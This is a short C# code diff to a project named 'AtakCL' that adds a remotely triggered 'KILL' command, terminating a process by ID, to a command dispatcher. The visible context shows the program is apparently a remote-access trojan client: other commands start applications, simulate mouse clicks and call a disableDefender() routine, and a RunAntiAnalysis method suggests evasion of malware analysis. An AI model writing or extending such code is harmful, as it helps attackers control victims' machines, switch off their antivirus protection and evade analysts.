@@ -110,6 +110,10 @@ namespace AtakCL
                             Thread t4 = new Thread(() => startApp(sData[1]));
                             t4.Start();
                             break;
+                        case "KILL":
+                            Thread t7 = new Thread(() => killProcess(sData[1]));
+                            t7.Start();
+                            break;
                         case "DEFENDER":
                             Thread t5 = new Thread(() => disableDefender());
                             t5.Start();
@@ -351,6 +355,18 @@ namespace AtakCL
             uint X = (uint)Cursor.Position.X;
             uint Y = (uint)Cursor.Position.Y;
             mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)X, (uint)Y, 0, 0);
+        }
+        static void killProcess(string pid)
+        {
+            Process[] process = Process.GetProcesses();
+            foreach (Process p in process)
+            {
+                if (p.Id == Convert.ToInt32(pid))
+                {
+                    p.Kill();
+                    break;
+                }
+            }
         }
 
         public static void RunAntiAnalysis()
